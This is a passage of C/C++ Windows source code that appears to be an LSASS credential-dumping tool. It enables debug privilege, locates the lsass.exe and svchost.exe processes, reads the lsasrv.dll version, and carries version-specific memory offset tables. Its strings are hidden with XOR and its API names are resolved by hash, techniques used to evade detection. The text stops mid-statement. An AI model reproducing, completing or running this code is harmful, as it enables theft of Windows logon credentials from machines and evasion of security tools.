
#include <Windows.h>

#include <tchar.h>
#define wotamaxiangshuijiaoa
#include <windows.h>

#include <stdio.h>

#include <tchar.h>

#include <tlhelp32.h>

#include <psapi.h>

#include <userenv.h>

#include <windows.h>

#include <wincrypt.h>

#define jinyongyutiaoshi

#define defincaoniam 9168

#define HASH_KEY						13

#pragma intrinsic( _rotr )



inline void MYS_ecureZeroMemory(char* fuck, int number) {

	for (int i = 0; i < number; i++) {

		fuck[i] = 0;

	}

}



void FBXorCrypt(char* str, size_t len) {

	int intArr[100] = { 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 };

	int i;

	for (i = 0; i < len; i++) {

		str[i] = intArr[i] ^ str[i];

	}

}

DWORD myfuckingpow(int a, int b) {

	int sum = 1;

	for (int i = 0; i < b; i++) {

		sum = a * sum;

	}

	if (b == 0)return 1;

	return sum;

}

typedef struct

{

	WORD	offset : 12;

	WORD	type : 4;

} IMAGE_RELOC, * PIMAGE_RELOC;

__forceinline DWORD ror(DWORD d)

{

	return _rotr(d, HASH_KEY);

}



__forceinline DWORD hash(char* c)

{

	register DWORD h = 0;

	do

	{

		h = ror(h);

		h += *c;

	} while (*++c);



	return h;

}

//



#define DEREF( name )*(UINT_PTR *)(name)

#define DEREF_64( name )*(DWORD64 *)(name)

#define DEREF_32( name )*(DWORD *)(name)

#define DEREF_16( name )*(WORD *)(name)

#define DEREF_8( name )*(BYTE *)(name)



#define KERNEL32DLL_HASH				0x6A4ABC5B

#define NTDLLDLL_HASH					0x3CFA685D



#define LOADLIBRARYA_HASH				0xEC0E4E8E

#define GETPROCADDRESS_HASH				0x7C0DFCAA

#define VIRTUALALLOC_HASH				0x91AFCA54

#define NTFLUSHINSTRUCTIONCACHE_HASH	0x534C0AB8

// struct _PEB is defined in Winternl.h but it is incomplete

// WinDbg> dt -v ntdll!_PEB

typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes

{

	struct _PEB_FREE_BLOCK* pNext;

	DWORD dwSize;

} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;



//===============================================================================================//

typedef struct _UNICODE_STR

{

	USHORT Length;

	USHORT MaximumLength;

	PWSTR pBuffer;

} UNICODE_STR, * PUNICODE_STR;



typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes

{

	DWORD dwLength;

	DWORD dwInitialized;

	LPVOID lpSsHandle;

	LIST_ENTRY InLoadOrderModuleList;

	LIST_ENTRY InMemoryOrderModuleList;

	LIST_ENTRY InInitializationOrderModuleList;

	LPVOID lpEntryInProgress;

} PEB_LDR_DATA, * PPEB_LDR_DATA;



typedef struct __PEB // 65 elements, 0x210 bytes

{

	BYTE bInheritedAddressSpace;

	BYTE bReadImageFileExecOptions;

	BYTE bBeingDebugged;

	BYTE bSpareBool;

	LPVOID lpMutant;

	LPVOID lpImageBaseAddress;

	PPEB_LDR_DATA pLdr;

	LPVOID lpProcessParameters;

	LPVOID lpSubSystemData;

	LPVOID lpProcessHeap;

	PRTL_CRITICAL_SECTION pFastPebLock;

	LPVOID lpFastPebLockRoutine;

	LPVOID lpFastPebUnlockRoutine;

	DWORD dwEnvironmentUpdateCount;

	LPVOID lpKernelCallbackTable;

	DWORD dwSystemReserved;

	DWORD dwAtlThunkSListPtr32;

	PPEB_FREE_BLOCK pFreeList;

	DWORD dwTlsExpansionCounter;

	LPVOID lpTlsBitmap;

	DWORD dwTlsBitmapBits[2];

	LPVOID lpReadOnlySharedMemoryBase;

	LPVOID lpReadOnlySharedMemoryHeap;

	LPVOID lpReadOnlyStaticServerData;

	LPVOID lpAnsiCodePageData;

	LPVOID lpOemCodePageData;

	LPVOID lpUnicodeCaseTableData;

	DWORD dwNumberOfProcessors;

	DWORD dwNtGlobalFlag;

	LARGE_INTEGER liCriticalSectionTimeout;

	DWORD dwHeapSegmentReserve;

	DWORD dwHeapSegmentCommit;

	DWORD dwHeapDeCommitTotalFreeThreshold;

	DWORD dwHeapDeCommitFreeBlockThreshold;

	DWORD dwNumberOfHeaps;

	DWORD dwMaximumNumberOfHeaps;

	LPVOID lpProcessHeaps;

	LPVOID lpGdiSharedHandleTable;

	LPVOID lpProcessStarterHelper;

	DWORD dwGdiDCAttributeList;

	LPVOID lpLoaderLock;

	DWORD dwOSMajorVersion;

	DWORD dwOSMinorVersion;

	WORD wOSBuildNumber;

	WORD wOSCSDVersion;

	DWORD dwOSPlatformId;

	DWORD dwImageSubsystem;

	DWORD dwImageSubsystemMajorVersion;

	DWORD dwImageSubsystemMinorVersion;

	DWORD dwImageProcessAffinityMask;

	DWORD dwGdiHandleBuffer[34];

	LPVOID lpPostProcessInitRoutine;

	LPVOID lpTlsExpansionBitmap;

	DWORD dwTlsExpansionBitmapBits[32];

	DWORD dwSessionId;

	ULARGE_INTEGER liAppCompatFlags;

	ULARGE_INTEGER liAppCompatFlagsUser;

	LPVOID lppShimData;

	LPVOID lpAppCompatInfo;

	UNICODE_STR usCSDVersion;

	LPVOID lpActivationContextData;

	LPVOID lpProcessAssemblyStorageMap;

	LPVOID lpSystemDefaultActivationContextData;

	LPVOID lpSystemAssemblyStorageMap;

	DWORD dwMinimumStackCommit;

} _PEB, * _PPEB;



// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY

//__declspec( align(8) ) 

typedef struct _LDR_DATA_TABLE_ENTRY

{

	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.

	LIST_ENTRY InMemoryOrderModuleList;

	LIST_ENTRY InInitializationOrderModuleList;

	PVOID DllBase;

	PVOID EntryPoint;

	ULONG SizeOfImage;

	UNICODE_STR FullDllName;

	UNICODE_STR BaseDllName;

	ULONG Flags;

	SHORT LoadCount;

	SHORT TlsIndex;

	LIST_ENTRY HashTableEntry;

	ULONG TimeDateStamp;

} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;



// WinDbg> dt -v ntdll!_PEB_

typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);

typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);

typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);

typedef DWORD(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);



char _final_md5_hash[33];

bool CalculateMD5(char* filePath) {

	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);



	if (hFile == INVALID_HANDLE_VALUE) {

		//	std::cerr << "Error opening file: " << (unsigned int)GetLastError() << std::endl;

		return false;

	}





	HCRYPTPROV hProv;

	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {

		//std::cerr << "CryptAcquireContext failed: " << (unsigned int)GetLastError() << std::endl;

		CloseHandle(hFile);

		return false;

	}



	HCRYPTHASH hHash;

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {

		///std::cerr << "CryptCreateHash failed: " << (unsigned int)GetLastError() << std::endl;

		CryptReleaseContext(hProv, 0);

		CloseHandle(hFile);

		return false;

	}



	const DWORD bufferSize = 8192;

	BYTE buffer[bufferSize];

	DWORD bytesRead;



	while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {

		if (!CryptHashData(hHash, buffer, bytesRead, 0)) {

			//	std::cerr << "CryptHashData failed: " << (unsigned int)GetLastError() << std::endl;

			CryptDestroyHash(hHash);

			CryptReleaseContext(hProv, 0);

			CloseHandle(hFile);

			return false;

		}

	}



	BYTE hash[16];

	DWORD hashSize = 16;

	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {

		//std::cerr << "CryptGetHashParam failed: " << (unsigned int)GetLastError() << std::endl;

		CryptDestroyHash(hHash);

		CryptReleaseContext(hProv, 0);

		CloseHandle(hFile);

		return false;

	}



	CryptDestroyHash(hHash);

	CryptReleaseContext(hProv, 0);

	CloseHandle(hFile);





	// Convert the binary hash to a hexadecimal string

	//printf("md5 hash:\n\t");
	char _fuckingstring[100];
	for (int i = 0; i < 16; i++) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 51; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
		sprintf(_final_md5_hash + i * 2, _fuckingstring, hash[i]);

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 114; _fuckingstring[2] = 11; _fuckingstring[3] = 1; FBXorCrypt(_fuckingstring, 4);
	printf(_fuckingstring, _final_md5_hash);





	return true;

}





int mainMD5() {
	char _fuckingstring[100];
	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
	//char filePath[100] = _fuckingstring;

	return CalculateMD5(_fuckingstring);

}

#define TABLE_LENGTH 1024

bool EnableDebugPrivilege()

{

	HANDLE tokenHandle;

	TOKEN_PRIVILEGES tokenPrivileges;

	LUID luid;



	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))

	{

		//std::cout << "Failed to open process token. Error: " << (unsigned int)GetLastError() << std::endl;

		return false;

	}



	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))

	{

		//std::cout << "Failed to lookup privilege value. Error: " << (unsigned int)GetLastError() << std::endl;

		CloseHandle(tokenHandle);

		return false;

	}



	tokenPrivileges.PrivilegeCount = 1;

	tokenPrivileges.Privileges[0].Luid = luid;

	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;



	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))

	{

		//std::cout << "Failed to adjust token privileges. Error: " << (unsigned int)GetLastError() << std::endl;

		CloseHandle(tokenHandle);

		return false;

	}



	CloseHandle(tokenHandle);

	return true;

}

bool FBFileExists(const char* szPath) {

	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&

		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

}

#pragma comment(lib, "Version.lib")



DWORD offset_table[TABLE_LENGTH] = {

	0x32BC3,

	0x1FA63

};




DWORD _offset_table[TABLE_LENGTH][5] = {
	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
	  {0x180B3,0x20CEC,0x94568,0x108,0x38}, // 10.0.19041.2913
	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
	  {0x2D2B3,0x1C55C,0x4250C,0x108,0x38},
	  {0x285FF,0x3992C,0x399EC,0x108,0x38},
	  {0x1FBAC,0x1AA1C,0x1AAE8,0x108,0x38},// 10.0.17763.1
	  {0x1C448,0x193EE,0x39B2A,0xE8,0x18},
	  {0x16030,0x110FE,0x32B0B,0xE8,0x18},
	  {0x4482B,0x4DBA8,0xB0A90,0xE8,0x38},
	  {0x10588,0xD8FE,0x4CE0C,0xE8,0x18},
	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}, // 10.0.19041.3324
	{0x37DEC,0x320FC,0x321C8,0xe8,0x38} , // 6548b134a3cf304b91490fe916d934b5
	{0x374DC,0x31E3C,0x31F08,0xe8,0x38},  // 951a238e964be37f74c32564d2a92319
	{0x39323,0x3016C,0x86FD4,0xe8,0x38} ,// dd8cacce0209e5f7c4c31720e24178f0
	{0x790c,0x3e018,0x3e03d,0xe8,0x38} // eb9aabe72baa8821b10a99cf4c086973
};

void getosversion(char* result) {

	char buffer[1024] = { 0 };
	char _fuckingstring[100];
	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
	//char PATH[1024] = _fuckingstring;

	GetFileVersionInfoA(_fuckingstring,

		NULL,

		1024,

		(LPVOID)buffer);

	//	printf("%s\n", buffer);

		// bufferFileVersionunicode

		// ,22

	int result_counter = 0;

	byte asdasdasdbyte[1024] = { 0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00 };

	for (int i = 0; i < 1024; i++) {

		// fileversion

		if (0 == memcmp(buffer + i, asdasdasdbyte, 22)) {

			// 

			char* versionoffset = buffer + i + 22 + 4;

			// unicode0

			byte terminator[1024] = { 0x0,0x0 };

			int first = 1;

			for (int gi = 0; gi < 1024; gi++) {

				if (0 == memcmp(versionoffset + gi, terminator, 2)) {

					// 

					return;

				}

				if (*(versionoffset + gi) != 0) {

					char _1[2] = { 0 };

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 114; _fuckingstring[2] = 1; FBXorCrypt(_fuckingstring, 3);
					sprintf_s(_1, _fuckingstring, versionoffset + gi);

					if (first == 1) {

						//strcpy_s(result,2, _1);

						memcpy_s(result + result_counter, 100, _1, 1);

						result_counter += 1;

						first = 0;

					}

					else {

						//strcat_s(result+1,2, _1);

						memcpy_s(result + result_counter, 100, _1, 1);

						result_counter += 1;

					}

				}

			}

		}

	}

}





int GetLsassPid() {

	PROCESSENTRY32 entry;

	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	char _fuckingstring[100];
	if (Process32First(hSnapshot, &entry)) {

		while (Process32Next(hSnapshot, &entry)) {

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 109; _fuckingstring[1] = 114; _fuckingstring[2] = 96; _fuckingstring[3] = 114; _fuckingstring[4] = 114; _fuckingstring[5] = 47; _fuckingstring[6] = 100; _fuckingstring[7] = 121; _fuckingstring[8] = 100; _fuckingstring[9] = 1; FBXorCrypt(_fuckingstring, 10);
			if (strcmp(entry.szExeFile, _fuckingstring) == 0) {

				return entry.th32ProcessID;

			}

		}

	}

	CloseHandle(hSnapshot);

	return 0;

}



int GetLsvchostsassPid() {
	char _fuckingstring[100];
	PROCESSENTRY32 entry;

	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {

		while (Process32Next(hSnapshot, &entry)) {

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 114; _fuckingstring[1] = 119; _fuckingstring[2] = 98; _fuckingstring[3] = 105; _fuckingstring[4] = 110; _fuckingstring[5] = 114; _fuckingstring[6] = 117; _fuckingstring[7] = 47; _fuckingstring[8] = 100; _fuckingstring[9] = 121; _fuckingstring[10] = 100; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
			if (strcmp(entry.szExeFile, _fuckingstring) == 0) {

				return entry.th32ProcessID;

			}

		}

	}

	CloseHandle(hSnapshot);

	return 0;

}



int main()
{
	char _fuckingstring0[100];
	MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde0 = (char*)malloc(100); memcpy(_caoniamde0, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 51; _fuckingstring0[12] = 56; _fuckingstring0[13] = 48; _fuckingstring0[14] = 50; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde1 = (char*)malloc(100); memcpy(_caoniamde1, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde2 = (char*)malloc(100); memcpy(_caoniamde2, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 55; _fuckingstring0[8] = 51; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde3 = (char*)malloc(100); memcpy(_caoniamde3, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde4 = (char*)malloc(100); memcpy(_caoniamde4, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde5 = (char*)malloc(100); memcpy(_caoniamde5, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde6 = (char*)malloc(100); memcpy(_caoniamde6, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde7 = (char*)malloc(100); memcpy(_caoniamde7, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde8 = (char*)malloc(100); memcpy(_caoniamde8, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde9 = (char*)malloc(100); memcpy(_caoniamde9, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde10 = (char*)malloc(100); memcpy(_caoniamde10, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 50; _fuckingstring0[13] = 51; _fuckingstring0[14] = 53; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde11 = (char*)malloc(100); memcpy(_caoniamde11, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde12 = (char*)malloc(100); memcpy(_caoniamde12, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde13 = (char*)malloc(100); memcpy(_caoniamde13, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 52; _fuckingstring0[13] = 54; _fuckingstring0[14] = 49; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde14 = (char*)malloc(100); memcpy(_caoniamde14, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 52; _fuckingstring0[13] = 1; FBXorCrypt(_fuckingstring0, 14); char* _caoniamde15 = (char*)malloc(100); memcpy(_caoniamde15, _fuckingstring0, 100);
	/*stringarray*/	char* version_table[TABLE_LENGTH] = {

	_caoniamde0,

	_caoniamde1,

	_caoniamde2,

	_caoniamde3,

	_caoniamde4,

	_caoniamde5,

	_caoniamde6,

	_caoniamde7,

	_caoniamde8,

	_caoniamde9,

	_caoniamde10,

	_caoniamde11,

	_caoniamde12,

	_caoniamde13,

	_caoniamde14,

	_caoniamde15

	};/*endarray*/

	MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 100; _fuckingstring0[1] = 57; _fuckingstring0[2] = 55; _fuckingstring0[3] = 51; _fuckingstring0[4] = 49; _fuckingstring0[5] = 49; _fuckingstring0[6] = 50; _fuckingstring0[7] = 96; _fuckingstring0[8] = 100; _fuckingstring0[9] = 96; _fuckingstring0[10] = 57; _fuckingstring0[11] = 98; _fuckingstring0[12] = 50; _fuckingstring0[13] = 53; _fuckingstring0[14] = 55; _fuckingstring0[15] = 50; _fuckingstring0[16] = 103; _fuckingstring0[17] = 54; _fuckingstring0[18] = 51; _fuckingstring0[19] = 101; _fuckingstring0[20] = 54; _fuckingstring0[21] = 51; _fuckingstring0[22] = 51; _fuckingstring0[23] = 52; _fuckingstring0[24] = 101; _fuckingstring0[25] = 48; _fuckingstring0[26] = 101; _fuckingstring0[27] = 103; _fuckingstring0[28] = 99; _fuckingstring0[29] = 98; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde16 = (char*)malloc(100); memcpy(_caoniamde16, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 51; _fuckingstring0[2] = 51; _fuckingstring0[3] = 100; _fuckingstring0[4] = 49; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 48; _fuckingstring0[8] = 103; _fuckingstring0[9] = 103; _fuckingstring0[10] = 96; _fuckingstring0[11] = 52; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 50; _fuckingstring0[15] = 99; _fuckingstring0[16] = 48; _fuckingstring0[17] = 100; _fuckingstring0[18] = 103; _fuckingstring0[19] = 50; _fuckingstring0[20] = 54; _fuckingstring0[21] = 99; _fuckingstring0[22] = 48; _fuckingstring0[23] = 49; _fuckingstring0[24] = 53; _fuckingstring0[25] = 103; _fuckingstring0[26] = 103; 